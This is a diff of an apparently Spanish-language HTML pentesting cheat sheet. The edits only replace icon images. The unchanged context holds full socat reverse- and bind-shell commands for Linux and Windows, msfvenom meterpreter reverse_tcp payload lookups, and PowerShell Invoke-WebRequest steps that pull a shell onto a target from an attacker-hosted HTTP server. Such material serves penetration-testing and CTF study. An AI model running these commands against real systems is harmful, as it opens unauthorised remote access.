@@ -155,14 +155,15 @@
                             class="comando4">socat TCP-L:&lt;PORT&gt; -
                             &lt;PORT&gt;</span>
                     </li>
-                    <li><span class="comando2">Crear una reverse shell en el target en Linux </span>
-                        <img src="https://img.icons8.com/color/40/000000/linux--v2.png" />:
+                    <li><img src="/images/tux.png" /><span class="comando2">Crear una reverse shell en el target en
+                            Linux </span>
+                        :
                         socat TCP:&lt;TURN0&gt;:&lt;PORT&gt; EXEC:"bash -li"
                         </span>
                     </li>
 
-                    <li><span class="comando2">Crear una reverse shell en el target en Windows </span><i
-                            class="fab fa-windows"></i>: <span class="comando4">
+                    <li><img src="/images/powershell.png" /><span class="comando2">Crear una reverse shell en el target
+                            en Windows </span><i class="fab fa-windows"></i>: <span class="comando4">
                             socat TCP:&lt;TURN0&gt;:&lt;PORT&gt; EXEC:powershell.exe,pipes
                         </span></li>
                 </ol>
@@ -172,14 +173,15 @@
             <li><span class="comando1">Bind shell</span>
 
                 <ol>
-                    <li><span class="comando2">Crear una reverse shell en el target en linux </span>
-                        <img src="https://img.icons8.com/color/40/000000/linux--v2.png" />:
-                        
-                            socat TCP-L:&lt;PORT&gt; EXEC:"bash -li"
+                    <li><img src="/images/tux.png" /><span class="comando2">Crear una reverse shell en el target en
+                            linux </span>
+                        :
+
+                        socat TCP-L:&lt;PORT&gt; EXEC:"bash -li"
                         </span>
                     </li>
-                    <li><span class="comando2">Crear una reverse shell en el target en windows </span><i
-                            class="fab fa-windows"></i>: <span class="comando4">
+                    <li><img src="/images/powershell.png" /><span class="comando2">Crear una reverse shell en el target
+                            en windows </span><i class="fab fa-windows"></i>: <span class="comando4">
                             socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes
                         </span></li>
 
@@ -222,7 +224,7 @@
             <br>
             <br>
 
-            <span class="pasos">WebShell <i class="fas fa-file-code"></i></span>
+            <span class="pasos">WebShell <img src="/images/webpage.png" alt="web"></span>
 
             <li><span class="comando1">Reverse shell</span>
                 <ol>
@@ -277,7 +279,7 @@
             <br>
             <br>
 
-            <span class="pasos">Msfvenom <i class="fas fa-code-branch"></i></span>
+            <span class="pasos">Msfvenom </span><span class="comando3"><img src="/images/ninja.png"/></span>
             <li><span class="comando1">Staged Shell</span>
                 <ol>
                     <li><span class="comando2">Staged</span>:
@@ -298,9 +300,9 @@
                         <span class="comando4">msfvenom --list payloads | grep
                             “&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;”</span>
                         <ol>
-                            <li><span class="comando3"><i class="fab fa-windows"></i> : msfvenom --list payloads | grep
+                            <li><span class="comando3"><img src="/images/powershell.png"/> : msfvenom --list payloads | grep
                                     “windows/x64/meterpreter/reverse_tcp” </span></li>
-                            <li><span class="comando3"><i class="fab fa-linux"></i> : msfvenom --list payloads | grep
+                            <li><span class="comando3"><img src="/images/tux.png" />: msfvenom --list payloads | grep
                                     “linux/x86/meterpreter_reverse_tcp" </span></li>
                         </ol>
                     </li>
@@ -329,7 +331,7 @@
                             <li><span class="comando4">sudo python3 -m http.server 80</span></li>
                         </ol>
                     </li>
-                    <li><span class="comando2"> Abrimos PowerShell en el target y descargamos la shell</span>
+                    <li> <span class="comando2"> Abrimos PowerShell en el target y descargamos la shell</span>
                         <ol>
                             <li><span class="comando4">Invoke-WebRequest -uri
                                     http://&lt;TURN0&gt;:&lt;PORT&gt;/&lt;reverse-file&gt; -outfile
@@ -469,7 +471,8 @@
 
             <span class="pasos">Tratamiento de tty</span>
 
-            <li><span class="comando1">Python <i class="fab fa-python"></i></span>
+            <li><span class="comando1">Python <img class="bash" src="/images/python.png" />
+                </span>
 
                 <ol>
                     <li><span class="comando2">1. Ejecutar para generar un Shell Bash</span>: <span class="comando4">
@@ -502,7 +505,9 @@
                 </ol>
             </li>
 
-            <li><span class="comando1">Bash <i class="fas fa-code"></i></span>
+            <li><span class="comando1">Bash</span>
+
+                <img class="bash" src="/images/bash_icon.png" />
                 <ol>
                     <li><span class="comando2">1. Ejecutar el siguiente comando </span>
                         <ol>
@@ -560,7 +565,8 @@
                             <li><span class="comando4">sudo python3 -m http.server 80</span></li>
                         </ol>
                     </li>
-                    <li><span class="comando2"> Abrimos PowerShell en el target y descargamos el archivo</span>
+                    <li><img src="/images/powershell.png" /><span class="comando2"> Abrimos PowerShell en el target y
+                            descargamos el archivo</span>
                         <ol>
                             <li><span class="comando4">Invoke-WebRequest -uri
                                     http://&lt;TURN0&gt;:&lt;PORT&gt;/&lt;reverse/file&gt; -outfile
@@ -569,8 +575,9 @@
                                     C:\\Windows\temp\shell.exe</span></li>
                         </ol>
                     </li>
-                    <li><span class="comando2">Linux target</span>
-                        <img src="https://img.icons8.com/color/40/000000/linux--v2.png" />
+                    <li><img src="/images/tux.png" />
+                        <span class="comando2">Linux target</span>
+
 
                         <ol>
                             <li><span class="comando3">En linux ejecutamos el siguiente comando</span></li>
